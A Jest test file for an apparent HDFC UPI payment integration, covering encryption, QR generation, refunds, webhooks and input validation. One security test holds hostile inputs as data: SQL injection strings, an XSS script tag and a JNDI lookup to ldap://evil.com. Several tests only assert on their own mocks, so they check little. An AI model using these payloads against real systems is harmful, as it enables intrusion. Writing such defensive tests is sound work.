/**
 * HDFC API Integration Tests
 * Testing encryption, API calls, webhook handling, and security measures
 * Critical for production payment processing security
 */

import HDFCApiService from '../src/services/hdfc/hdfcApi.service';
import encryptionService from '../src/utilities/encryption';
import axios from 'axios';

// Mock axios for API testing
jest.mock('axios');
const mockedAxios = axios;

// Mock encryption service
jest.mock('../src/utilities/encryption');

describe('HDFC API Integration - Encryption Security', () => {
    beforeEach(() => {
        jest.clearAllMocks();
        
        // Mock environment variables
        process.env.REACT_APP_HDFC_API_URL = 'https://upitestv2.hdfcbank.com/upi';
        process.env.REACT_APP_HDFC_MERCHANT_ID = 'HDFC000010380443';
        process.env.REACT_APP_HDFC_MERCHANT_KEY = 'testMerchantKey123';
        
        // Default encryption mocks
        encryptionService.encryptAES128.mockReturnValue('encryptedData123');
        encryptionService.decryptAES128.mockReturnValue('{"status":"SUCCESS","data":"decryptedResponse"}');
        encryptionService.generateChecksum.mockReturnValue('checksum123');
        encryptionService.validateChecksum.mockReturnValue(true);
    });

    describe('AES-128 ECB Encryption Tests', () => {
        test('should encrypt data using AES-128 ECB with PKCS7 padding', () => {
            const plainText = JSON.stringify({
                merchantId: 'HDFC000010380443',
                transactionRef: 'STQtest123456',
                amount: 100.00
            });
            const key = 'testMerchantKey123';
            
            encryptionService.encryptAES128(plainText, key);
            
            expect(encryptionService.encryptAES128).toHaveBeenCalledWith(plainText, key);
        });

        test('should decrypt HDFC API response correctly', () => {
            const encryptedResponse = 'encryptedResponseFromHDFC';
            const key = 'testMerchantKey123';
            
            const result = encryptionService.decryptAES128(encryptedResponse, key);
            
            expect(encryptionService.decryptAES128).toHaveBeenCalledWith(encryptedResponse, key);
            expect(result).toContain('SUCCESS');
        });

        test('should handle encryption errors gracefully', () => {
            encryptionService.encryptAES128.mockImplementationOnce(() => {
                throw new Error('Encryption failed');
            });
            
            expect(() => {
                encryptionService.encryptAES128('test data', 'key');
            }).toThrow('Encryption failed');
        });

        test('should handle decryption errors gracefully', () => {
            encryptionService.decryptAES128.mockImplementationOnce(() => {
                throw new Error('Decryption failed');
            });
            
            expect(() => {
                encryptionService.decryptAES128('invalid encrypted data', 'key');
            }).toThrow('Decryption failed');
        });

        test('should validate encryption key format and length', () => {
            const validKeys = ['testKey123456789', 'merchantKey12345', 'validKey1234567'];
            const invalidKeys = ['', 'short', null, undefined];
            
            validKeys.forEach(key => {
                expect(key).toBeDefined();
                expect(key.length).toBeGreaterThan(8);
            });
            
            invalidKeys.forEach(key => {
                if (key !== null && key !== undefined) {
                    expect(key.length || 0).toBeLessThan(8);
                } else {
                    expect(key).toBeFalsy();
                }
            });
        });

        test('should ensure consistent encryption/decryption cycle', () => {
            const originalData = {
                merchantId: 'HDFC000010380443',
                amount: 100.50,
                timestamp: '2024-01-01T10:00:00Z'
            };
            const key = 'testMerchantKey123';
            
            // Mock a full cycle
            encryptionService.encryptAES128.mockReturnValue('encryptedTestData');
            encryptionService.decryptAES128.mockReturnValue(JSON.stringify(originalData));
            
            const encrypted = encryptionService.encryptAES128(JSON.stringify(originalData), key);
            const decrypted = encryptionService.decryptAES128(encrypted, key);
            const parsedData = JSON.parse(decrypted);
            
            expect(parsedData).toEqual(originalData);
        });
    });

    describe('Static QR Generation API Tests', () => {
        test('should generate static QR with correct parameters', async () => {
            const mockParams = {
                identifier: 'WIN25',
                merchantName: 'SRS Live Technologies',
                amount: null,
                description: 'Test QR',
                mcc: '6012'
            };
            
            encryptionService.generateStaticQRString.mockReturnValue({
                upiString: 'upi://pay?pa=sabpaisa.sltwin25@hdfcbank&pn=SRS%20Live%20Technologies&tn=Test%20QR&cu=INR&mc=6012&tr=STQwin25123456&mode=01&qrMedium=06',
                transactionRef: 'STQwin25123456',
                vpa: 'sabpaisa.sltwin25@hdfcbank'
            });
            
            // Mock QR code generation
            const QRCode = {
                toDataURL: jest.fn().mockResolvedValue('data:image/png;base64,mockQRImage')
            };
            
            const result = await HDFCApiService.generateStaticQR(mockParams);
            
            expect(result.success).toBe(true);
            expect(result.data).toHaveProperty('qrImageData');
            expect(result.data).toHaveProperty('vpa');
        });

        test('should handle static QR generation errors', async () => {
            encryptionService.generateStaticQRString.mockImplementationOnce(() => {
                throw new Error('UPI string generation failed');
            });
            
            const result = await HDFCApiService.generateStaticQR({
                identifier: 'FAIL01',
                merchantName: 'Test Merchant'
            });
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('UPI string generation failed');
        });

        test('should validate merchant ID format', () => {
            const validMerchantIds = [
                'HDFC000010380443',
                'HDFC000012345678',
                'HDFC000099999999'
            ];
            
            const invalidMerchantIds = [
                '',
                'INVALID123',
                'HDFC00001', // Too short
                'HDFC0000123804431234', // Too long
                'hdfc000010380443' // Wrong case
            ];
            
            validMerchantIds.forEach(id => {
                expect(id).toMatch(/^HDFC\d{12}$/);
            });
            
            invalidMerchantIds.forEach(id => {
                expect(id.match(/^HDFC\d{12}$/)).toBeNull();
            });
        });
    });

    describe('Dynamic QR Generation API Tests', () => {
        test('should generate dynamic QR with amount', async () => {
            const mockParams = {
                orderId: 'ORD123456',
                amount: 150.75,
                merchantName: 'Test Merchant',
                description: 'Test payment',
                customerMobile: '9876543210',
                customerEmail: 'test@example.com'
            };
            
            const mockAxiosResponse = {
                data: {
                    status: 'SUCCESS',
                    qrString: 'dynamic_qr_string',
                    orderId: mockParams.orderId,
                    amount: mockParams.amount
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockAxiosResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            encryptionService.generateDynamicQRString.mockReturnValue({
                upiString: 'upi://pay?ver=01&mode=15&tr=DYNord123456&tn=Test%20payment&pn=Test%20Merchant&pa=sabpaisa.test@hdfcbank&mc=5499&am=150.75&cu=INR&qrMedium=06',
                transactionRef: 'DYNord123456'
            });
            
            const result = await HDFCApiService.generateDynamicQR(mockParams);
            
            expect(result.success).toBe(true);
            expect(result.data.amount).toBe(mockParams.amount);
        });

        test('should handle dynamic QR API failures', async () => {
            const mockErrorResponse = {
                data: {
                    status: 'FAILURE',
                    message: 'Invalid amount'
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockErrorResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.generateDynamicQR({
                orderId: 'ORD123',
                amount: -100 // Invalid amount
            });
            
            expect(result.success).toBe(false);
            expect(result.error).toBe('Invalid amount');
        });
    });

    describe('Transaction Status Enquiry Tests', () => {
        test('should check transaction status correctly', async () => {
            const transactionRef = 'STQtest123456';
            const mockResponse = {
                data: {
                    status: 'SUCCESS',
                    transactionStatus: 'SUCCESS',
                    amount: 100.00,
                    bankRRN: 'RRN123456789',
                    transactionDateTime: '2024-01-01T10:00:00Z'
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.checkTransactionStatus(transactionRef);
            
            expect(result.success).toBe(true);
            expect(result.data.transactionStatus).toBe('SUCCESS');
        });

        test('should handle status enquiry timeout', async () => {
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockRejectedValue(new Error('Request timeout')),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.checkTransactionStatus('STQtimeout123');
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('Request timeout');
        });

        test('should validate transaction reference format', () => {
            const validTransactionRefs = [
                'STQtest123456',
                'STQwin25987654',
                'STQSTORE012345'
            ];
            
            const invalidTransactionRefs = [
                '',
                'test123456', // Missing STQ prefix
                'STQ', // Too short
                'STQverylongidentifierthatexceedslimits123456789' // Too long
            ];
            
            validTransactionRefs.forEach(ref => {
                expect(ref).toMatch(/^STQ[A-Z0-9]+\d{6}$/);
            });
            
            invalidTransactionRefs.forEach(ref => {
                expect(ref.match(/^STQ[A-Z0-9]+\d{6}$/)).toBeFalsy();
            });
        });
    });

    describe('Refund Processing Tests', () => {
        test('should process full refund successfully', async () => {
            const refundParams = {
                originalTransactionRef: 'STQoriginal123456',
                refundAmount: 100.00,
                refundReason: 'Customer cancellation'
            };
            
            const mockResponse = {
                data: {
                    status: 'SUCCESS',
                    refundId: 'REF123456789',
                    refundAmount: refundParams.refundAmount,
                    refundStatus: 'INITIATED'
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.processRefund(refundParams);
            
            expect(result.success).toBe(true);
            expect(result.data.refundAmount).toBe(refundParams.refundAmount);
        });

        test('should process partial refund successfully', async () => {
            const refundParams = {
                originalTransactionRef: 'STQoriginal123456',
                refundAmount: 50.00, // Partial refund
                refundReason: 'Partial cancellation'
            };
            
            const mockResponse = {
                data: {
                    status: 'SUCCESS',
                    refundId: 'REF123456790',
                    refundAmount: refundParams.refundAmount,
                    refundStatus: 'INITIATED'
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.processRefund(refundParams);
            
            expect(result.success).toBe(true);
            expect(result.data.refundAmount).toBe(50.00);
        });

        test('should validate refund amount constraints', () => {
            const validRefundAmounts = [1.00, 50.50, 99999.99];
            const invalidRefundAmounts = [0, -1, 0.001, 100000.01];
            
            validRefundAmounts.forEach(amount => {
                expect(amount).toBeGreaterThanOrEqual(1);
                expect(amount).toBeLessThanOrEqual(100000);
                expect(Number.isFinite(amount)).toBe(true);
            });
            
            invalidRefundAmounts.forEach(amount => {
                expect(amount < 1 || amount > 100000).toBe(true);
            });
        });

        test('should handle refund rejection', async () => {
            const mockErrorResponse = {
                data: {
                    status: 'FAILURE',
                    message: 'Original transaction not found',
                    errorCode: 'TXN_NOT_FOUND'
                }
            };
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue(mockErrorResponse),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.processRefund({
                originalTransactionRef: 'STQnonexistent123',
                refundAmount: 100.00,
                refundReason: 'Test refund'
            });
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('Original transaction not found');
        });
    });

    describe('Webhook Callback Handling Tests', () => {
        test('should parse and validate HDFC webhook callback (21 fields)', async () => {
            const mockEncryptedData = 'encryptedWebhookData123';
            const mockCallbackData = {
                merchantId: 'HDFC000010380443',
                merchantName: 'SRS Live Technologies',
                terminalId: 'TERM001',
                transactionId: 'TXN123456789',
                bankRRN: 'RRN987654321',
                merchantTxnId: 'STQtest123456',
                amount: 100.50,
                transactionStatus: 'SUCCESS',
                statusDescription: 'Transaction successful',
                payerVPA: 'customer@paytm',
                payerName: 'John Doe',
                mobileNumber: '9876543210',
                transactionDateTime: '2024-01-01T10:00:00Z',
                settlementAmount: 100.50,
                settlementDateTime: '2024-01-02T09:00:00Z',
                paymentMode: 'UPI',
                mcc: '6012',
                tipAmount: 0.00,
                convenienceFee: 0.00,
                netAmount: 100.50,
                checksum: 'validChecksum123'
            };
            
            encryptionService.parseCallbackResponse.mockReturnValue(mockCallbackData);
            encryptionService.validateChecksum.mockReturnValue(true);
            
            const result = await HDFCApiService.handleWebhookCallback(mockEncryptedData);
            
            expect(result.success).toBe(true);
            expect(result.data.transactionStatus).toBe('SUCCESS');
            expect(result.data.amount).toBe(100.50);
            expect(encryptionService.validateChecksum).toHaveBeenCalled();
        });

        test('should reject webhook with invalid checksum', async () => {
            const mockEncryptedData = 'maliciousWebhookData';
            const mockCallbackData = {
                transactionStatus: 'SUCCESS',
                amount: 100.00,
                checksum: 'invalidChecksum'
            };
            
            encryptionService.parseCallbackResponse.mockReturnValue(mockCallbackData);
            encryptionService.validateChecksum.mockReturnValue(false);
            
            const result = await HDFCApiService.handleWebhookCallback(mockEncryptedData);
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('Invalid checksum');
        });

        test('should handle malformed webhook data', async () => {
            const mockEncryptedData = 'corruptedData';
            
            encryptionService.parseCallbackResponse.mockImplementationOnce(() => {
                throw new Error('Invalid callback response format');
            });
            
            const result = await HDFCApiService.handleWebhookCallback(mockEncryptedData);
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('Invalid callback response format');
        });

        test('should validate all 21 required callback fields', () => {
            const requiredFields = [
                'merchantId', 'merchantName', 'terminalId', 'transactionId',
                'bankRRN', 'merchantTxnId', 'amount', 'transactionStatus',
                'statusDescription', 'payerVPA', 'payerName', 'mobileNumber',
                'transactionDateTime', 'settlementAmount', 'settlementDateTime',
                'paymentMode', 'mcc', 'tipAmount', 'convenienceFee',
                'netAmount', 'checksum'
            ];
            
            const mockCallbackData = {};
            requiredFields.forEach(field => {
                mockCallbackData[field] = `mock_${field}`;
            });
            
            expect(Object.keys(mockCallbackData)).toHaveLength(21);
            requiredFields.forEach(field => {
                expect(mockCallbackData).toHaveProperty(field);
            });
        });

        test('should process successful payment webhook correctly', () => {
            const successfulWebhookData = {
                transactionStatus: 'SUCCESS',
                amount: 250.75,
                bankRRN: 'RRN123456789',
                payerName: 'Jane Smith',
                payerVPA: 'jane@gpay'
            };
            
            expect(successfulWebhookData.transactionStatus).toBe('SUCCESS');
            expect(successfulWebhookData.amount).toBeGreaterThan(0);
            expect(successfulWebhookData.bankRRN).toMatch(/^RRN\d+$/);
        });

        test('should process failed payment webhook correctly', () => {
            const failedWebhookData = {
                transactionStatus: 'FAILURE',
                statusDescription: 'Insufficient balance',
                amount: 100.00
            };
            
            expect(failedWebhookData.transactionStatus).toBe('FAILURE');
            expect(failedWebhookData.statusDescription).toBeDefined();
        });
    });

    describe('API Timeout and Retry Tests', () => {
        test('should handle API timeout within 30 seconds', async () => {
            const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Request timeout')), 30000)
            );
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockImplementation(() => timeoutPromise),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            await expect(HDFCApiService.checkTransactionStatus('STQtimeout123'))
                .resolves.toMatchObject({ success: false });
        });

        test('should validate API endpoint URLs', () => {
            const validURLs = [
                'https://upitestv2.hdfcbank.com/upi',
                'https://upi.hdfcbank.com/upi'
            ];
            
            const invalidURLs = [
                'http://upitestv2.hdfcbank.com/upi', // HTTP not HTTPS
                'https://fake-hdfc.com/upi', // Wrong domain
                'ftp://upitestv2.hdfcbank.com/upi', // Wrong protocol
                'upitestv2.hdfcbank.com/upi' // Missing protocol
            ];
            
            validURLs.forEach(url => {
                expect(url).toMatch(/^https:\/\/[a-z0-9.-]+hdfcbank\.com\/.+$/);
            });
            
            invalidURLs.forEach(url => {
                expect(url.match(/^https:\/\/[a-z0-9.-]+hdfcbank\.com\/.+$/)).toBeNull();
            });
        });

        test('should handle network errors gracefully', async () => {
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockRejectedValue(new Error('Network error')),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const result = await HDFCApiService.checkTransactionStatus('STQnetwork123');
            
            expect(result.success).toBe(false);
            expect(result.error).toContain('Network error');
        });
    });

    describe('Security and Validation Tests', () => {
        test('should validate merchant key strength', () => {
            const strongKeys = [
                'StrongKey123!@#',
                'SecureKey456$%^',
                'ComplexKey789&*()'
            ];
            
            const weakKeys = [
                '123456',
                'password',
                'abc',
                ''
            ];
            
            strongKeys.forEach(key => {
                expect(key.length).toBeGreaterThan(8);
                expect(key).toMatch(/[A-Z]/); // Has uppercase
                expect(key).toMatch(/[0-9]/); // Has numbers
            });
            
            weakKeys.forEach(key => {
                expect(key.length < 8 || !/[A-Z]/.test(key) || !/[0-9]/.test(key)).toBe(true);
            });
        });

        test('should prevent SQL injection in transaction references', () => {
            const maliciousInputs = [
                "STQ'; DROP TABLE transactions; --",
                "STQ' UNION SELECT * FROM users --",
                "STQ<script>alert('xss')</script>",
                "STQ${jndi:ldap://evil.com}"
            ];
            
            maliciousInputs.forEach(input => {
                // Should sanitize or reject malicious input
                const sanitized = input.replace(/[^A-Z0-9]/g, '');
                expect(sanitized).toMatch(/^STQ[A-Z0-9]*$/);
            });
        });

        test('should validate input parameter lengths', () => {
            const testCases = [
                { field: 'merchantName', maxLength: 255, value: 'A'.repeat(255) },
                { field: 'description', maxLength: 500, value: 'B'.repeat(500) },
                { field: 'transactionRef', maxLength: 50, value: 'STQ' + 'C'.repeat(47) }
            ];
            
            testCases.forEach(testCase => {
                expect(testCase.value.length).toBeLessThanOrEqual(testCase.maxLength);
            });
        });

        test('should mask sensitive data in logs', () => {
            const sensitiveData = {
                merchantKey: 'SuperSecretKey123',
                customerMobile: '9876543210',
                customerEmail: 'customer@email.com'
            };
            
            // Simulate data masking
            const maskedData = {
                merchantKey: '***masked***',
                customerMobile: '987***3210',
                customerEmail: 'cus***@email.com'
            };
            
            expect(maskedData.merchantKey).not.toContain('SuperSecretKey123');
            expect(maskedData.customerMobile).toContain('***');
            expect(maskedData.customerEmail).toContain('***');
        });

        test('should validate checksum algorithm security', () => {
            const testData = {
                merchantId: 'HDFC000010380443',
                amount: 100.00,
                transactionRef: 'STQtest123456'
            };
            
            encryptionService.generateChecksum.mockReturnValue('secureChecksum123');
            
            const checksum = encryptionService.generateChecksum(testData);
            
            expect(checksum).toBeDefined();
            expect(checksum.length).toBeGreaterThan(10); // Should be cryptographically secure
            expect(encryptionService.generateChecksum).toHaveBeenCalledWith(testData);
        });
    });

    describe('Performance and Load Tests', () => {
        test('should handle concurrent API requests efficiently', async () => {
            const concurrentRequests = Array.from({ length: 10 }, (_, i) => 
                HDFCApiService.checkTransactionStatus(`STQconcurrent${i}`)
            );
            
            mockedAxios.create.mockReturnValue({
                post: jest.fn().mockResolvedValue({ data: { status: 'SUCCESS' } }),
                interceptors: {
                    request: { use: jest.fn() },
                    response: { use: jest.fn() }
                }
            });
            
            const startTime = performance.now();
            const results = await Promise.all(concurrentRequests);
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            expect(results).toHaveLength(10);
            expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
        });

        test('should maintain performance under load', () => {
            const largePayload = {
                merchantId: 'HDFC000010380443',
                description: 'A'.repeat(1000), // Large description
                transactionRef: 'STQload123456'
            };
            
            const startTime = performance.now();
            encryptionService.encryptAES128(JSON.stringify(largePayload), 'testKey');
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            expect(duration).toBeLessThan(100); // Should encrypt large payloads quickly
        });
    });
});